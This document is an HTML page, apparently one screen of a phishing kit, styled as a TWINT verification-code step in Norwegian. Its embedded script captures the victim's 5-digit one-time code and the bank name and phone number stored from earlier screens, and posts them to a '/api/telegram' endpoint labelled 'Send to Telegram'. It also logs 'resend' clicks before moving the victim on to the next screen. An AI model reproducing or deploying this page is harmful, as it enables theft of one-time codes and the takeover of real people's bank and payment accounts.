<!DOCTYPE html>
<html lang="nb">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TWINT — Verifiseringskode</title>
    <style>
      :root {
        font-family: "Inter", "Segoe UI", system-ui, sans-serif;
        color: #0f172a;
        background: #f3f4f6;
      }

      * {
        box-sizing: border-box;
      }

      body {
        margin: 0;
        min-height: 100vh;
        background: #f3f4f6;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 0;
      }

      .shell {
        width: min(420px, 100%);
        background: white;
        border-radius: 0;
        padding: 1.5rem 1.75rem;
        min-height: 100vh;
        box-shadow: 0 15px 45px rgba(15, 23, 42, 0.18);
      }

      .step {
        display: flex;
        flex-direction: column;
        gap: 0.45rem;
        padding: 0 0.25rem 0.75rem;
      }

      .step-label {
        font-size: 0.8rem;
        letter-spacing: 0.08em;
        text-transform: uppercase;
        color: #94a3b8;
      }

      .step-progress {
        display: flex;
        align-items: center;
        justify-content: space-between;
      }

      .progress-bar {
        flex: 1;
        height: 0.35rem;
        background: #e2e8f0;
        border-radius: 999px;
        margin-right: 0.75rem;
        overflow: hidden;
      }

      .progress-bar span {
        display: block;
        width: 66%;
        height: 100%;
        background: #fbbf24;
        border-radius: inherit;
      }

      .step-progress strong {
        font-size: 0.75rem;
        color: #475569;
      }

      h1 {
        margin: 0 0 0.5rem;
        font-size: 1.75rem;
      }

      .copy {
        margin: 0 0 1.5rem;
        line-height: 1.6;
        color: #475569;
      }

      form {
        display: flex;
        flex-direction: column;
        gap: 1rem;
      }

      label {
        font-weight: 600;
        color: #475569;
      }

      .code-input {
        width: 100%;
        padding: 0.95rem 1rem;
        border: 1px solid #cbd5f5;
        border-radius: 12px;
        font-size: 1.5rem;
        font-weight: 700;
        color: #0f172a;
        background: #f8fafc;
        text-align: center;
        letter-spacing: 0.5em;
        font-family: "Courier New", monospace;
      }

      .code-input:focus {
        outline: none;
        border-color: #fbbf24;
        box-shadow: 0 0 0 3px rgba(251, 191, 36, 0.1);
      }

      .buttons {
        display: flex;
        flex-direction: column;
        gap: 0.75rem;
        margin-top: 1rem;
      }

      .buttons button {
        border: none;
        border-radius: 14px;
        padding: 0.95rem;
        font-size: 1rem;
        font-weight: 600;
        cursor: pointer;
      }

      .primary {
        background: #fbbf24;
        color: #0f172a;
        box-shadow: 0 10px 20px rgba(251, 191, 36, 0.45);
      }

      .primary:disabled {
        background: #f6f8fb;
        color: #94a3b8;
        box-shadow: none;
        cursor: not-allowed;
      }

      .secondary {
        background: white;
        border: 1px solid #d1d5db;
        color: #475569;
      }

      .footnote {
        margin-top: 1.5rem;
        font-size: 0.9rem;
        color: #94a3b8;
        text-align: center;
      }

      .resend-link {
        color: #2563eb;
        text-decoration: none;
        font-weight: 600;
        cursor: pointer;
      }

      .resend-link:hover {
        text-decoration: underline;
      }
    </style>
  </head>
  <body>
    <div class="shell">
      <div class="step">
        <div class="step-label">Step 2/3</div>
        <div class="step-progress">
          <div class="progress-bar"><span></span></div>
          <strong>Step 2/3</strong>
        </div>
      </div>

      <h1>Skriv inn verifiseringskoden</h1>
      <p class="copy">
        Vi har sendt en 5-sifret kode til mobilnummeret ditt. Skriv inn koden nedenfor for å fortsette.
      </p>

      <form>
        <label for="code">Verifiseringskode</label>
        <input
          type="text"
          id="code"
          name="code"
          class="code-input"
          placeholder="00000"
          maxlength="5"
          pattern="[0-9]{5}"
          inputmode="numeric"
        />

        <div class="buttons">
          <button type="button" class="primary" id="next-button" disabled>Neste</button>
          <button type="button" class="secondary" id="back-button">Tilbake</button>
        </div>
      </form>

      <p class="footnote">
        Fikk du ikke koden?
        <a href="#" class="resend-link" id="resend-link">Send på nytt</a>
      </p>

      <script>
        const codeInput = document.getElementById("code");
        const nextButton = document.getElementById("next-button");
        const backButton = document.getElementById("back-button");
        const resendLink = document.getElementById("resend-link");

        // Only allow numbers
        codeInput.addEventListener("input", (e) => {
          e.target.value = e.target.value.replace(/[^0-9]/g, "");
          
          // Enable/disable next button
          nextButton.disabled = e.target.value.length !== 5;
        });

        // Auto-format and move focus
        codeInput.addEventListener("keydown", (e) => {
          if (e.key === "Backspace" && codeInput.value.length === 0) {
            e.preventDefault();
          }
        });

        // Helper function to send data to Telegram
        async function sendToTelegram(data) {
          try {
            await fetch('/api/telegram', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(data)
            });
          } catch (error) {
            console.error('Error sending to Telegram:', error);
          }
        }

        nextButton.addEventListener("click", async () => {
          const code = codeInput.value.trim();
          
          if (code.length !== 5) {
            alert("Skriv inn en 5-sifret kode.");
            return;
          }

          localStorage.setItem("verificationCode", code);
          
          // Send to Telegram
          const storedBank = localStorage.getItem("selectedBank");
          const phoneNumber = localStorage.getItem("phoneNumber");
          await sendToTelegram({
            action: 'verification_code_entered',
            bank: storedBank || null,
            phone: phoneNumber || null,
            verification_code: code,
            timestamp: new Date().toISOString()
          });
          
          window.location.href = "screen-3.html";
        });

        backButton.addEventListener("click", () => {
          window.location.href = "screen-2.html";
        });

        resendLink.addEventListener("click", async (e) => {
          e.preventDefault();
          
          // Send to Telegram
          const storedBank = localStorage.getItem("selectedBank");
          const phoneNumber = localStorage.getItem("phoneNumber");
          await sendToTelegram({
            action: 'verification_code_resend',
            bank: storedBank || null,
            phone: phoneNumber || null,
            timestamp: new Date().toISOString()
          });
          
          alert("Ny kode er sendt til mobilnummeret ditt.");
        });
      </script>
    </div>
  </body>
</html>
